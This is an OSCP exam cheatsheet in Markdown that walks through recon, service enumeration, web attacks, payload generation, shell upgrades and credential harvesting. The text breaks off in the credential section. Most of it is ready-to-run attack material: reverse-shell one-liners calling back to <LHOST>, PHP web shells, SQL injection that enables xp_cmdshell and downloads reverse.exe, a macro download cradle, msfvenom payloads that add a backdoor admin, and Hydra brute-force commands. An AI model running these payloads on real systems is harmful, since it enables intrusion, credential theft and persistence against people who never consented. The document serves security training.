# OSCP Master Cheatsheet

> A methodical, exam-flow cheatsheet for authorized OSCP labs/exam environments. Replace placeholders such as `<IP>`, `<DOMAIN>`, `<USER>`, `<PASS>`, `<HASH>`, `<LHOST>`, and `<LPORT>` with your authorized target values.
>
> GitHub-safe note: do not commit real flags, passwords, NTLM hashes, private keys, API tokens, screenshots containing secrets, or exam-only material.

---

## 0. Exam Mindset & Attack Flow

### Core Flow

1. Build workspace and variables.
2. Discover hosts and ports.
3. Enumerate every exposed service.
4. Identify likely attack paths.
5. Exploit for initial access.
6. Stabilize shell.
7. Harvest credentials.
8. Escalate locally.
9. Reuse credentials and pivot.
10. Repeat enumeration from every new foothold.
11. Capture proof and document commands/screenshots.

### High-Yield Rules

- Always enumerate before exploiting.
- Always check UDP, especially SNMP.
- Always check `/etc/hosts`, hostnames, and web vhosts.
- Always look for credentials in config files, backups, `.git`, shares, databases, XML, TXT, history, and hidden files.
- Always run `whoami /priv` on Windows.
- Always run `id`, `sudo -l`, and SUID/capability checks on Linux.
- Always spray newly found credentials across SMB, WinRM, RDP, MSSQL, SSH, and FTP where appropriate.
- Always check `C:\Windows.old`, `C:\xampp`, web roots, user Desktop/Documents/Downloads, and `SYSVOL`.
- Always stabilize your shell before privilege escalation.
- Prefer simple wins over rabbit holes.

---

## 1. Workspace Setup

```bash
mkdir -p ~/oscp/{scans,web,exploits,loot,creds,screenshots,tools,notes}
cd ~/oscp

export IP=<IP>
export LHOST=<KALI_TUN0_IP>
export LPORT=443
export DOMAIN=<DOMAIN>
export USER=<USER>
export PASS='<PASS>'
```

### Quick Files

```bash
touch ips.txt users.txt passwords.txt hashes.txt notes.md
```

### Kali Web Server

```bash
cd ~/oscp/tools
python3 -m http.server 80
python3 -m http.server 8080
```

### Better Netcat Listener

```bash
rlwrap nc -nlvp 443
rlwrap nc -nlvp 4444
```

---

## 2. Host Discovery & Port Scanning

### Ping Sweep / Alive Hosts

```bash
sudo nmap -sn <SUBNET>/24 -oA scans/ping-sweep
sudo nmap -vvv -sn <SUBNET>/24 -oA scans/ping-sweep-vvv
nmap -sn -n <SUBNET>/24 > scans/ip-range.txt
nmap -sP 10.0.0.0-100
```

### Full TCP Scan

```bash
sudo nmap -p- --min-rate 5000 -Pn -n $IP -oA scans/allports-$IP
```

### Version and Script Scan

```bash
ports=$(grep -oP '\d+/open' scans/allports-$IP.gnmap | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -p "$ports" -Pn $IP -oA scans/svc-$IP
```

### UDP Top Ports

```bash
sudo nmap -sU --top-ports 100 -Pn $IP -oA scans/udp-top100-$IP
sudo nmap -sU -p 53,69,123,137,161,162,500,514,520,623,1900 -Pn $IP -oA scans/udp-common-$IP
```

### Autorecon

```bash
autorecon $IP -o scans/autorecon-$IP
autorecon -t targets.txt -o scans/autorecon
```

### Nmap Vulnerability Scripts

```bash
cd /usr/share/nmap/scripts
cat script.db | grep '"vuln"'

sudo nmap -sV -p <PORT> --script vuln $IP
sudo nmap -sV -p <PORT> --script "<SCRIPT_NAME>" $IP

sudo nmap --script-updatedb
```

---

## 3. DNS Enumeration

### Record Types to Remember

- `A`: IPv4 host record.
- `AAAA`: IPv6 host record.
- `NS`: authoritative nameservers.
- `MX`: mail servers.
- `PTR`: reverse lookup.
- `CNAME`: alias.
- `TXT`: arbitrary text such as SPF, verification, or leaked metadata.

### Whois and Host

```bash
whois <DOMAIN>
whois <DOMAIN> -h <WHOIS_SERVER>

host <HOSTNAME>
host -t mx <DOMAIN>
host -t ns <DOMAIN>
host -t txt <DOMAIN>
```

### Forward Lookup Bruteforce

```bash
for sub in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt); do
  host $sub.<DOMAIN> | grep -v "not found"
done
```

### Reverse Lookup Sweep

```bash
for ip in $(seq 1 254); do host <SUBNET_PREFIX>.$ip; done | grep -v "not found"
```

### dnsrecon / dnsenum

```bash
dnsrecon -d <DOMAIN>
dnsrecon -d <DOMAIN> -t axfr
dnsrecon -d <DOMAIN> -D /usr/share/dnsrecon/subdomains-top1mil-20000.txt -t brt

dnsenum <DOMAIN>
dnsenum <DOMAIN> -f /usr/share/dnsenum/dns.txt
```

---

## 4. Service Enumeration

---

### 4.1 FTP - 21

```bash
nmap -sCV -p21 $IP
nmap --script ftp-* -p21 $IP
```

### Anonymous Login

```bash
ftp anonymous@$IP
# Password: anonymous
```

### FTP with Credentials

```bash
ftp $IP
lftp -u '<USER>,<PASS>' $IP
```

### Recursive Download

```bash
wget -m ftp://anonymous:anonymous@$IP/
wget -m --user='<USER>' --password='<PASS>' ftp://$IP/
```

### Hydra FTP

```bash
hydra -V -f -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP:21 -u -vV -T 40 -I
hydra -V -f -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://$IP:21 -u -vV -T 40 -I
```

### FTP Notes

- Check if FTP maps to a web root.
- Look for `.htpasswd`, config files, database backups, SSH keys, and upload permissions.
- If you can upload to a web-served directory, try PHP/ASPX/JSP web shell based on stack.

---

### 4.2 SSH - 22

```bash
nmap -sCV -p22 $IP
ssh <USER>@$IP
ssh -i id_rsa <USER>@$IP
```

### SSH Key Permissions

```bash
chmod 600 id_rsa
chmod 400 id_rsa
ssh -i id_rsa <USER>@$IP
```

### Hydra SSH

```bash
hydra -V -f -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://$IP:22 -u -vV -T 40 -I
hydra -V -f -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP:22 -u -vV -T 40 -I
hydra -V -f -L users.txt -p '<PASS>' ssh://$IP:22 -u -vV -T 40 -I
```

---

### 4.3 SMB / NetBIOS / RPC - 139, 445

### Nmap SMB

```bash
nmap -n -v -Pn -p139,445 -sV $IP
nmap -p139,445 --script smb-enum* $IP
nmap -p139,445 --script smb-vuln* $IP
nmap -p139,445 --script smb-os-discovery $IP
```

### smbclient

```bash
smbclient -L //$IP/
smbclient -L //$IP/ -N
smbclient -L //$IP/ -U '<USER>%<PASS>'

smbclient //$IP/<SHARE> -N
smbclient //$IP/<SHARE> -U '<USER>%<PASS>'

smbclient -L //$IP --option='client min protocol=NT1'
smbclient //$IP/<SHARE> --option='client min protocol=NT1'
```

### Recursive SMB Download

```bash
smbclient //$IP/<SHARE> -U '<USER>%<PASS>' -c 'recurse; prompt off; mget *'
```

Inside smbclient:

```bash
RECURSE ON
PROMPT OFF
mget *
```

### smbmap

```bash
smbmap -H $IP
smbmap -u '' -p '' -H $IP
smbmap -u guest -p '' -H $IP
smbmap -u '<USER>' -p '<PASS>' -d '<DOMAIN>' -H $IP

smbmap -H $IP -R <SHARE>
smbmap -R <SHARE> -H $IP -A '<FILE_REGEX>' -q
smbmap -u '<USER>' -p '<PASS>' -H $IP -s <SHARE> -R -A '.*'
```

### rpcclient Null Session

```bash
rpcclient -U "" -N $IP
rpcclient -U "%" $IP
```

Inside rpcclient:

```bash
srvinfo
enumdomains
enumdomusers
enumdomgroups
queryuser <RID>
querygroup <RID>
getdompwinfo
```

### enum4linux-ng

```bash
enum4linux-ng -A $IP
enum4linux-ng -A -u '<USER>' -p '<PASS>' $IP
```

### NetExec / CrackMapExec SMB

```bash
nxc smb $IP
nxc smb ips.txt -u '<USER>' -p '<PASS>'
nxc smb ips.txt -u users.txt -p passwords.txt --continue-on-success
nxc smb ips.txt -u '<USER>' -H '<NTLM_HASH>'
nxc smb ips.txt -u '<USER>' -p '<PASS>' --local-auth
nxc smb ips.txt -u '<USER>' -p '<PASS>' --shares
nxc smb ips.txt -u '<USER>' -p '<PASS>' -M spider_plus
nxc smb ips.txt -u '<USER>' -p '<PASS>' --generate-hosts-file hosts.out
```

### NetExec File Transfer and Command Exec

```bash
nxc smb $IP -u '<USER>' -p '<PASS>' --put-file ./file.exe C:\\Windows\\Temp\\file.exe
nxc smb $IP -u '<USER>' -p '<PASS>' --get-file C:\\Windows\\Temp\\loot.txt ./loot.txt
nxc smb $IP -u '<USER>' -p '<PASS>' -x "whoami"
nxc smb $IP -u '<USER>' -p '<PASS>' -X "whoami; hostname"
```

### SMB Brute Force

```bash
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $IP smb

nmap -p445 --script smb-brute \
  --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt \
  $IP -vvvv
```

### SMB Checklist

- Anonymous shares.
- Guest access.
- Writable shares.
- Backups and scripts.
- Web root overlap.
- `SYSVOL`.
- GPP XML files with `cpassword`.
- Config files containing passwords.
- SSH keys.
- Database files.
- `Windows.old`.
- Local admin indicator: `(Pwn3d!)`.

---

### 4.4 SMTP - 25, 465, 587

```bash
nmap -sCV -p25,465,587 $IP
nmap --script=smtp* -p25 $IP

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p25 $IP
```

### Manual SMTP

```bash
telnet $IP 25
nc -nv $IP 25
```

SMTP commands:

```bash
HELO test.local
EHLO test.local
VRFY root
VRFY admin
EXPN root
EXPN users
```

### smtp-user-enum

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $IP
smtp-user-enum -M EXPN -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP
```

### Multiple SMTP Servers

```bash
for server in $(cat smtpmachines.txt); do
  echo "******** $server ********"
  smtp-user-enum -M VRFY -U users.txt -t $server
done
```

### Hydra SMTP

```bash
hydra -P /usr/share/wordlists/nmap.lst $IP smtp -V
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 25 -V $IP smtp
```

---

### 4.5 SNMP - UDP 161

### Nmap SNMP

```bash
sudo nmap -sU -p161 --script snmp-* $IP
ls -l /usr/share/nmap/scripts/snmp*
```

### Community String Bruteforce

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt $IP
```

### snmpwalk / snmpbulkwalk

```bash
snmpwalk -v1 -c public $IP
snmpwalk -v2c -c public $IP
snmpwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2
```

### Required Exact Command

```bash
snmpbulkwalk -v2c -c public -Cr1000 192.168.104.156 . | grep -iE "passwd|password|username"
```

### SNMP Credential Hunting

```bash
snmpwalk -v2c -c public $IP . | tee loot/snmp-$IP.txt
grep -iE "pass|passwd|password|user|username|login|cred|token|secret|key|private" loot/snmp-$IP.txt
```

### snmpcheck

```bash
snmpcheck -t $IP -c public
```

### SNMPv3

```bash
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
ruby snmpv3enum.rb
```

### SNMP Notes

- Check for leaked usernames.
- Check for reset scripts or `NET-SNMP-EXTEND-MIB`.
- Check installed software.
- Check running processes.
- Check cleartext command arguments.
- Check custom scripts and backups.

---

### 4.6 HTTP / HTTPS - 80, 443, 8080, 8000, 8443

### Initial Web Recon

```bash
whatweb http://$IP
whatweb -a 3 http://$IP

curl -i http://$IP/
curl -k -i https://$IP/
curl -s http://$IP/robots.txt
curl -s http://$IP/sitemap.xml
```

### Headers and Methods

```bash
curl -i -X OPTIONS http://$IP/
nmap --script http-methods,http-title,http-server-header -p80,443,8080 $IP
```

### Directory Bruteforce

```bash
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,js,aspx,asp,bak,zip -t 50

feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,js,aspx,asp,bak,zip -k

ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.txt,.bak,.zip,.aspx,.asp,.html
```

### Vhost Fuzzing

```bash
ffuf -u http://$IP/ -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>
```

### Nikto

```bash
nikto -h http://$IP
nikto -h https://$IP -ssl
```

### Git Exposure

```bash
curl -i http://$IP/.git/HEAD
wget -r http://$IP/.git/

git-dumper http://$IP/.git/ dumped
cd dumped
git status
git log --oneline --all
git show
git show <COMMIT>
grep -RniE "pass|password|user|username|token|secret|key|db_|mysql|pgsql" .
```

### WordPress

```bash
wpscan --url http://$IP/ --enumerate u,p,t,tt --plugins-detection aggressive
wpscan --url http://$IP/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

WordPress admin RCE path:

```text
wp-admin -> Appearance -> Theme Editor -> edit 404.php or active theme template -> paste PHP shell -> browse to modified template.
```

### Web Shell Paths

```bash
ls /usr/share/webshells/
ls /usr/share/webshells/php/
ls /usr/share/webshells/aspx/
```

### PHP Web Shell

```php
<?php system($_GET["cmd"]); ?>
```

```bash
curl "http://$IP/shell.php?cmd=id"
curl "http://$IP/shell.php?cmd=whoami"
```

---

### 4.7 NFS - 111, 2049

```bash
nmap -sV -p111,2049 --script nfs-* $IP
showmount -e $IP
mkdir -p /mnt/nfs
sudo mount -t nfs $IP:/<SHARE> /mnt/nfs -o nolock
find /mnt/nfs -type f -maxdepth 5 -ls
```

If root squashing is disabled:

```bash
sudo cp /bin/bash /mnt/nfs/bash
sudo chmod +s /mnt/nfs/bash
./bash -p
```

---

### 4.8 MySQL - 3306

```bash
nmap -sCV -p3306 $IP
mysql -u root -p -h $IP -P 3306
mysql -u root -p'root' -h $IP -P 3306 --skip-ssl
```

MySQL recon:

```sql
select version();
select system_user();
show databases;
use <database>;
show tables;
select user, authentication_string from mysql.user;
```

### MySQL File Write Web Shell

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";
```

---

### 4.9 MSSQL - 1433

```bash
nmap -sCV -p1433 $IP
nxc mssql $IP -u '<USER>' -p '<PASS>'
nxc mssql ips.txt -u '<USER>' -p '<PASS>'
```

### Impacket MSSQL Client

```bash
impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>@<IP>' -windows-auth
impacket-mssqlclient '<USER>:<PASS>@<IP>' -windows-auth
```

MSSQL recon:

```sql
SELECT @@version;
SELECT SYSTEM_USER;
SELECT name FROM sys.databases;
SELECT * FROM <database>.information_schema.tables;
```

Enable and use `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Download and execute payload:

```sql
EXEC xp_cmdshell 'powershell -c "iwr -uri http://<LHOST>/reverse.exe -OutFile C:\Windows\Temp\reverse.exe"';
EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe';
```

---

### 4.10 WinRM - 5985, 5986

```bash
nmap -sCV -p5985,5986 $IP
nxc winrm ips.txt -u '<USER>' -p '<PASS>'
nxc winrm ips.txt -u '<USER>' -H '<NTLM_HASH>'
```

```bash
evil-winrm -i $IP -u '<USER>' -p '<PASS>'
evil-winrm -i $IP -u '<USER>' -H '<NTLM_HASH>'
evil-winrm -S -i $IP -u '<USER>' -p '<PASS>'
```

Evil-WinRM upload/download:

```powershell
upload /usr/share/peass/winpeas/winPEASx64.exe
download C:\Users\<USER>\Desktop\loot.txt
```

---

### 4.11 RDP - 3389

```bash
nmap -sCV -p3389 $IP
nxc rdp ips.txt -u '<USER>' -p '<PASS>'
xfreerdp /u:<USER> /p:'<PASS>' /v:$IP +clipboard /cert:ignore
xfreerdp /d:<DOMAIN> /u:<USER> /p:'<PASS>' /v:$IP +clipboard /cert:ignore
```

Through proxychains:

```bash
proxychains xfreerdp /d:<DOMAIN> /u:<USER> /p:'<PASS>' /v:<INTERNAL_IP> +clipboard /cert:ignore
```

---

### 4.12 LDAP / Kerberos / AD Ports - 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269 $IP
nmap --script ldap* -p389,636,3268,3269 $IP
```

```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -x -H ldap://$IP -b "DC=<DOMAIN>,DC=<LOCAL>"
```

Kerberos user enum:

```bash
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt
```

---

### 4.13 Redis - 6379

```bash
nmap -sCV -p6379 $IP
redis-cli -h $IP
```

Redis commands:

```bash
INFO
CONFIG GET *
KEYS *
GET <KEY>
```

---

### 4.14 FreeSWITCH Event Socket - 8021

```bash
nmap -sCV -p8021 $IP
searchsploit freeswitch
```

Exam pattern:

```bash
python3 <EXPLOIT>.py $IP 'powershell -enc <BASE64_PAYLOAD>'
```

---

### 4.15 H2 Database / Java Web Consoles

```bash
nmap -sCV -p8082,9092 $IP
searchsploit h2 database
```

Look for:

- Default or weak console credentials.
- JDBC URL injection.
- Java command execution.
- File write or script execution features.

---

### 4.16 Squid Proxy - 3128, 8080

```bash
nmap -sCV -p3128,8080 $IP
curl -x http://$IP:3128 http://127.0.0.1/
```

Internal port discovery via proxy:

```bash
for p in 21 22 80 443 445 3306 3389 5985 8080; do
  timeout 3 curl -s -x http://$IP:3128 http://127.0.0.1:$p/ -I && echo "Port $p open"
done
```

---

## 5. Web Application Attacks

---

### 5.1 LFI / Directory Traversal

Look for parameters like:

```text
?page=
?file=
?path=
?document=
?template=
?lang=
?cwd=
```

Linux files:

```bash
curl "http://$IP/index.php?page=../../../../etc/passwd"
curl --path-as-is "http://$IP/../../../../etc/passwd"
curl "http://$IP/index.php?page=../../../../var/www/html/config.php"
curl "http://$IP/index.php?page=../../../../home/<USER>/.ssh/id_rsa"
```

Windows files:

```bash
curl "http://$IP/index.php?page=../../../../Windows/win.ini"
curl "http://$IP/index.php?page=../../../../Users/Administrator/.ssh/id_rsa"
curl "http://$IP/index.php?page=../../../../inetpub/wwwroot/web.config"
```

PHP wrappers:

```bash
curl "http://$IP/index.php?page=php://filter/convert.base64-encode/resource=index.php"
curl "http://$IP/index.php?page=data://text/plain,<?php system($_GET['cmd']); ?>"
```

---

### 5.2 SQL Injection

### Basic Tests

```text
'
"
' OR 1=1 --
" OR 1=1 --
admin' --
offsec' OR 1=1 --
```

### MSSQL Time-Based

```text
'; WAITFOR DELAY '0:0:3' --
```

### MySQL Time-Based

```text
' AND IF(1=1,SLEEP(3),0)-- -
```

### UNION Column Count

```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

### Displayable Columns

```text
' UNION SELECT 'a1','a2','a3','a4','a5'--
```

### Database Info

```sql
UNION SELECT null, database(), user(), @@version, null--
```

### Dump Data

```sql
' UNION SELECT null, username, password, description, null FROM users--
```

### MySQL Web Shell via OUTFILE

```sql
' UNION SELECT null, null, "<?php system($_REQUEST['cmd']); ?>", null INTO OUTFILE "/var/www/html/shell.php"-- -
```

```bash
curl "http://$IP/shell.php?cmd=id"
```

### PostgreSQL RCE via COPY FROM PROGRAM

```sql
'; DROP TABLE IF EXISTS rce_store; CREATE TABLE rce_store(res text); COPY rce_store FROM PROGRAM 'id';--
' UNION SELECT NULL, CAST(res AS INTEGER), NULL, NULL, NULL, NULL FROM rce_store--
```

### MSSQL xp_cmdshell via Injection

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -c "Start-Sleep -s 5"';--
```

Download web shell:

```sql
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<LHOST>:8888/cmdasp.aspx -OutFile C:\inetpub\wwwroot\cmdasp.aspx"';--
```

Execute reverse shell:

```sql
'; EXEC xp_cmdshell 'powershell -c "iwr -uri http://<LHOST>:8888/reverse.exe -OutFile C:\Windows\Temp\reverse.exe"';--
'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe';--
```

### sqlmap

```bash
sqlmap -u "http://$IP/vuln.php?param=1" -p param
sqlmap -u "http://$IP/vuln.php?param=1" -p param --dump
sqlmap -r request.txt -p <PARAM>
sqlmap -r request.txt -p <PARAM> --os-shell
sqlmap -r request.txt -p <PARAM> --os-shell --web-root "/var/www/html/tmp"
```

---

### 5.3 File Upload Bypasses

### Extensions

```text
php
php3
php4
php5
phtml
phar
asp
aspx
jsp
jspx
```

### Double Extensions

```text
shell.php.jpg
shell.jpg.php
shell.phtml
```

### Apache .htaccess

```apache
AddType application/x-httpd-php .evil
```

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.evil
```

### Magic Bytes

```bash
printf 'GIF89a;' > shell.php
cat real_shell.php >> shell.php
```

### Upload to SSH Authorized Keys via Traversal

```bash
ssh-keygen -t rsa -N '' -f key
cat key.pub > authorized_keys
# Try upload path traversal into ../../../home/<USER>/.ssh/authorized_keys
ssh -i key <USER>@$IP
```

---

### 5.4 Command Injection

Test payloads:

```bash
id
whoami
hostname
;id
&& id
| id
`id`
$(id)
```

PowerShell download cradle:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://<LHOST>/powercat.ps1");powercat -c <LHOST> -p <LPORT> -e powershell
```

---

### 5.5 Exposed Git Repository Pattern

```bash
curl -i http://$IP/.git/HEAD
git-dumper http://$IP/.git/ dumped
cd dumped
git log --oneline --all
git show
git show <COMMIT>
grep -RniE "pass|password|username|token|secret|key|db|mysql|pgsql" .
```

If credentials are found:

```bash
ssh <USER>@$IP
ftp $IP
mysql -u <USER> -p'<PASS>' -h $IP
nxc smb $IP -u '<USER>' -p '<PASS>'
```

---

### 5.6 ODT / Macro Upload Pattern

LibreOffice Basic macro pattern:

```vb
Sub Main
 Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://<LHOST>:8080/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell")
End Sub
```

Listener:

```bash
rlwrap nc -nlvp <LPORT>
python3 -m http.server 8080
```

---

## 6. Exploit Sourcing & Fixing

### SearchSploit

```bash
sudo apt update
sudo apt install exploitdb

searchsploit <TERM>
searchsploit -t "<APP_NAME>"
searchsploit -e "<APP_NAME> <VERSION>"
searchsploit <TERM> --exclude="(PoC)|/dos/"
searchsploit -w <TERM>
searchsploit -m <EDB_ID>
searchsploit -m <PATH>
```

### Public Exploit Review Checklist

- Read the code.
- Look for hardcoded IPs, ports, credentials, paths, payloads.
- Look for suspicious callbacks, encoded blobs, destructive commands.
- Check required arguments.
- Check whether authentication is required.
- Check architecture and target version.
- Test in a lab if possible.
- Modify only after copying locally.

### Fix Python Web Exploits

```python
# Common self-signed TLS fix
requests.get(url, verify=False)
requests.post(url, data=data, verify=False)
```

Debug parsing errors:

```python
print(response.status_code)
print(response.text[:1000])
```

### Cross-Compile Windows Exploits

```bash
sudo apt install mingw-w64

i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -std=gnu89
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32

x86_64-w64-mingw32-gcc exploit.cpp --shared -o exploit.dll
i686-w64-mingw32-gcc exploit.cpp --shared -o exploit.dll
```

### Run Windows Binary on Kali for Quick Testing

```bash
wine exploit.exe
```

### msfvenom Payloads

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o reverse32.exe
msfvenom -p windows/x64/exec CMD="cmd.exe /c whoami" -f exe -o exec.exe
msfvenom -p windows/adduser USER=hacker PASS='Password123!' -f exe -o useradd.exe
msfvenom -p windows/x64/exec CMD="cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add" -f dll -o hijack.dll
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o reverse.elf
```

### MSI Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -a x64 --platform Windows -f msi -o evil.msi
```

---

## 7. Initial Access Payloads & File Transfer

---

### 7.1 Reverse Shell One-Liners

### Bash

```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

### Netcat

```bash
nc -e /bin/sh <LHOST> <LPORT>
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc <LHOST> <LPORT> > /tmp/f
```

### Python

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

### PowerShell

```powershell
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Base64 PowerShell Encoding

```bash
echo -n '<POWERSHELL_COMMAND>' | iconv -t UTF-16LE | base64 -w 0
```

```powershell
powershell -enc <BASE64>
```

---

### 7.2 File Transfer - Linux Target

```bash
wget http://<LHOST>/file -O /tmp/file
curl http://<LHOST>/file -o /tmp/file
python3 -m http.server 80
```

```bash
scp file <USER>@<IP>:/tmp/file
scp <USER>@<IP>:/path/to/file .
```

### Base64 Transfer

```bash
base64 -w0 file
echo '<BASE64>' | base64 -d > file
chmod +x file
```

---

### 7.3 File Transfer - Windows Target

```powershell
iwr -uri http://<LHOST>/file.exe -Outfile file.exe
Invoke-WebRequest -Uri http://<LHOST>/file.exe -OutFile file.exe
certutil -urlcache -split -f http://<LHOST>/file.exe file.exe
bitsadmin /transfer job http://<LHOST>/file.exe C:\Windows\Temp\file.exe
```

Evil-WinRM:

```powershell
upload file.exe
download loot.txt
```

SMB server from Kali:

```bash
impacket-smbserver share . -smb2support
```

Windows copy:

```cmd
copy \\<LHOST>\share\file.exe C:\Windows\Temp\file.exe
```

---

## 8. Shell Upgrades

---

### 8.1 Basic Python TTY Upgrade

Run in the reverse shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

If Python 3 only:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```bash
Ctrl+Z
```

On Kali:

```bash
stty raw -echo; fg
```

Back in target shell:

```bash
reset
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

### 8.2 Full TTY Flow

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

### 8.3 script TTY

```bash
script -qc /bin/bash /dev/null
```

### 8.4 rlwrap Listener

```bash
rlwrap -cAr nc -lvnp <LPORT>
```

### 8.5 Socat Stable TTY

Kali:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```

Target:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

### 8.6 Windows Shell Upgrade Notes

- Prefer Evil-WinRM when credentials or hashes are available.
- Use PowerShell reverse shells for command execution.
- Use RDP if GUI access helps inspect apps, Thunderbird, browser-saved files, or ProcMon.
- Upload `nc.exe`, `powercat.ps1`, or a generated `reverse.exe` if needed.

---

## 9. Dedicated Credential Harvesting

---

### 9.1 Linux Credential Harvesting

### Quick Grep for Secrets

```bash
grep -RniE "pass|passwd|password|pwd|user|username|login|cred|creds|secret|token|api|key|private|db_|database" /home /var/www /opt /srv /tmp 2>/dev/null
```

### Hidden Files

```bash
find / -name ".*" -type f 2>/dev/null
find /home -name ".*" -type f -maxdepth 4 2>/dev/null -ls
grep -RniE "pass|password|secret|token|key" /home/*/.* 2>/dev/null
```

### Text, Config, XML, JSON, YAML, INI

```bash
find / -type f \( -name "*.txt" -o -name "*.xml" -o -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.json" -o -name "*.yml" -o -name "*.yaml" \) 2>/dev/null

find /home /var/www /opt /srv -type f \( -name "*.txt" -o -name "*.xml" -o -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.json" -o -name "*.yml" -o -name "*.yaml" \) -exec grep -HniE "pass|password|user|username|secret|token|key|database|db_" {} \; 2>/dev/null
```

### Database Files: .db / .sqlite / .sqlite3

```bash
find / -type f \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) 2>/dev/null
file <DATABASE_FILE>
sqlite3 <DATABASE_FILE> ".tables"
sqlite3 <DATABASE_FILE> "select * from users;"
sqlite3 <DATABASE_FILE> "select * from credentials;"
sqlite3 <DATABASE_FILE> "select * from accounts;"
```

Search strings inside DB files:

```bash
strings <DATABASE_FILE> | grep -iE "pass|password|user|username|hash|secret|token"
```

### Web Configs

```bash
find /var/www -type f -maxdepth 6 2>/dev/null
grep -RniE "DB_PASSWORD|DB_USERNAME|password|passwd|pwd|database|mysql|pgsql|redis" /var/www 2>/dev/null
```

Common files:

```bash
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/.env
cat /opt/*/.env
```

### SSH Keys

```bash
